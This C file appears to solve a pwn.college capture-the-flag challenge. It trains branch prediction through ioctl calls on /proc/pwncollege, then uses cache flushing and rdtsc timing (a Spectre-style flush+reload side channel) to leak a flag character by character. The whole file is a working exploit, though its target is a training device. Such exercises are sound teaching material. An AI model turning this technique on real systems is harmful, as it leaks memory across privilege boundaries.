#define _GNU_SOURCE

#include <fcntl.h>
#include <sched.h>
#include <semaphore.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <x86intrin.h>

#define PAGE_SIZE 0x1000

#define FLAG_PREFIX "FLAG: pwn.college"
#define FLAGLEN 58 + 6
#define START 32
#define END 0x7f
#define THRESHOLD 200

typedef struct __page_data {
  char data[PAGE_SIZE];
} page;

static int dev_fd;
#define COMM ioctl(dev_fd, 0, 0);
#define for_each_char(var) for (int var = START; var < END; var++)

void set_idx(void *ptr, uint64_t idx) { *(uint64_t *)ptr = idx; }

size_t measure(void *ptr) {
  register void *reg_ptr asm("rdi") = ptr;
  size_t start, end;

  start = __rdtsc();
  _mm_lfence();
  asm volatile("mov r8, qword ptr [%0]" : : "r"(reg_ptr) : "r8");
  _mm_lfence();
  end = __rdtsc();

  return end - start;
}

void flush_pages(int start, int end, page *mem) {
  for (int i = start; i < end; i++)
    _mm_clflush(mem + i);
}

void train_target(void *ptr) {
#define TRAIN_FOR 6 // :)

  set_idx(ptr, 0);
  for (size_t i = 0; i < TRAIN_FOR; i++) {
    COMM
  }
}

size_t get_threshold(void *ptr) {
#define NUM 6

  size_t sum = 0;
  for (int i = 0; i < NUM; i++) {
    set_idx(ptr, i);
    flush_pages(START, END, ptr);

    COMM

        sum += measure(ptr + FLAG_PREFIX[i]);
  }

  return sum / NUM;
}

int main(void) {
  char flag[FLAGLEN] = {0};
  size_t threshold;

  dev_fd = open("/proc/pwncollege", O_RDWR);
  if (dev_fd < 0) {
    perror("open");
    exit(1);
  }

  page *mmaped_ptr = mmap(NULL, PAGE_SIZE * END, PROT_READ | PROT_WRITE,
                          MAP_SHARED | MAP_POPULATE, dev_fd, 0);
  if (mmaped_ptr == MAP_FAILED) {
    perror("mmap");
    exit(1);
  }

AGAIN:
  threshold = get_threshold(mmaped_ptr);
  printf("Threshold: %zu\n\n", threshold);

  for (int i = 0; i < FLAGLEN; i++) {
    size_t hits[END] = {0};

    for (int _ = 0; _ < 500; _++) {
      train_target(mmaped_ptr);
      set_idx(mmaped_ptr, i);
      flush_pages(START, END, mmaped_ptr);

      COMM

      for_each_char(j) {
        volatile int mix_j = (((j * j) * 2));
        mix_j = (mix_j / j) ^ 1;
        mix_j ^= 1;
        mix_j /= 2;

        size_t time = measure(&mmaped_ptr[mix_j]);
        if (time <= threshold)
          hits[mix_j] += 1;
      }
    }

    size_t max_hits = 0;
    int ch = 0;
    for_each_char(j) {
      size_t hit = hits[j];
      printf("%2d/%3d (%c) - hits: %ld\n", i, j, j, hit);
      if (hit && max_hits < hit) {
        max_hits = hit;
        ch = j;
      }
    }

    if (ch) {
      flag[i] = ch;
      printf("\n\n - %c with hits of %zu - \n\n", flag[i], max_hits);
      if (i == sizeof FLAG_PREFIX - 2 &&
          memcmp(flag, FLAG_PREFIX, sizeof FLAG_PREFIX - 1)) {
        printf("problem!: %s\n", flag);
        getchar();
        goto AGAIN;
      }
    } else
      i--;
  }

  printf("flag: %s\n", flag);
}
